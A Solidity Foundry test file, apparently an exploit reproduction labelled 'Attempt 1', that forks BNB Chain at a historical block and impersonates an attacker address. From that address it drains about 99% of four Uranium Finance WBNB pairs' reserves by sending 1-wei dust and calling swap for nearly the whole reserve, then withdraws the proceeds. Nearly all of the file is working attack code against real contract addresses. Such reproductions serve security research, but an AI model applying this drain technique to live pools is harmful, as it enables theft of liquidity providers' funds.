// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairMinimal {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IWBNB is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @title Attempt 1
/// @notice Hypothesis: Uranium's pair invariant is 100x too loose, allowing a two-step drain of each WBNB pair.
contract Attempt1 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    address constant PAIR_WBNB_BUSD = 0x9B9baD4c6513E0fF3fB77c739359D59601c7cAfF;
    address constant PAIR_ETH_WBNB = 0x2aC639c4016aCe2906Dc04657Aaa58Fbb2a74728;
    address constant PAIR_BTCB_WBNB = 0x04536Fb62db86cCF3C7b9b9dDd6dc10feDc92148;
    address constant PAIR_U92_WBNB = 0xdD0C4a96A43b36d91F4FEdf83489B954C287886A;

    uint256 constant FORK_BLOCK = 6_919_826;
    uint256 constant DUST = 1;

    function setUp() public {
        vm.createSelectFork("ch1", FORK_BLOCK);

        vm.label(ATTACKER, "AttackerEOA");
        vm.label(address(WBNB), "WBNB");
        vm.label(PAIR_WBNB_BUSD, "Uranium_WBNB_BUSD");
        vm.label(PAIR_ETH_WBNB, "Uranium_ETH_WBNB");
        vm.label(PAIR_BTCB_WBNB, "Uranium_BTCB_WBNB");
        vm.label(PAIR_U92_WBNB, "Uranium_U92_WBNB");
    }

    /// @notice Verifies that the top four Uranium WBNB pairs can be drained for ~99% of their WBNB reserves.
    function test_exploit() public {
        uint256 nativeBefore = ATTACKER.balance;
        console.log("ATTACKER_NATIVE_BEFORE:", nativeBefore);
        console.log("ATTACKER_WBNB_BEFORE:", WBNB.balanceOf(ATTACKER));

        vm.startPrank(ATTACKER);

        // Seed 1 wei of WBNB so the first leg can use WBNB as its dust input.
        WBNB.deposit{value: DUST}();

        _drainWbnbPair(PAIR_WBNB_BUSD, true);
        _drainWbnbPair(PAIR_ETH_WBNB, false);
        _drainWbnbPair(PAIR_BTCB_WBNB, false);
        _drainWbnbPair(PAIR_U92_WBNB, false);

        uint256 wbnbBeforeWithdraw = WBNB.balanceOf(ATTACKER);
        console.log("ATTACKER_WBNB_BEFORE_WITHDRAW:", wbnbBeforeWithdraw);
        WBNB.withdraw(wbnbBeforeWithdraw);

        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("ATTACKER_NATIVE_AFTER:", nativeAfter);
        console.log("ATTACKER_NATIVE_DELTA:", nativeAfter - nativeBefore);
        assertGt(nativeAfter, nativeBefore, "native balance must strictly increase");
    }

    function _drainWbnbPair(address pair, bool wbnbIsToken0) internal {
        uint256 wbnbBefore = WBNB.balanceOf(ATTACKER);
        console.log("DRAINING_PAIR:", pair);

        // First leg: use WBNB dust to take ~99% of the non-WBNB side.
        _drainSide(pair, !wbnbIsToken0);

        // Second leg: use 1 wei of the drained counter-token to take ~99% of the WBNB side.
        _drainSide(pair, wbnbIsToken0);

        uint256 wbnbAfter = WBNB.balanceOf(ATTACKER);
        console.log("PAIR_WBNB_GAIN:", wbnbAfter - wbnbBefore);
    }

    function _drainSide(address pair, bool outputToken0) internal {
        IUniswapV2PairMinimal target = IUniswapV2PairMinimal(pair);
        (uint112 reserve0, uint112 reserve1, ) = target.getReserves();

        address inputToken = outputToken0 ? target.token1() : target.token0();
        require(IERC20Minimal(inputToken).balanceOf(ATTACKER) >= DUST, "missing dust");

        _safeTransfer(inputToken, pair, DUST);

        uint256 amount0Out = outputToken0 ? (uint256(reserve0) * 99) / 100 : 0;
        uint256 amount1Out = outputToken0 ? 0 : (uint256(reserve1) * 99) / 100;

        target.swap(amount0Out, amount1Out, ATTACKER, "");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
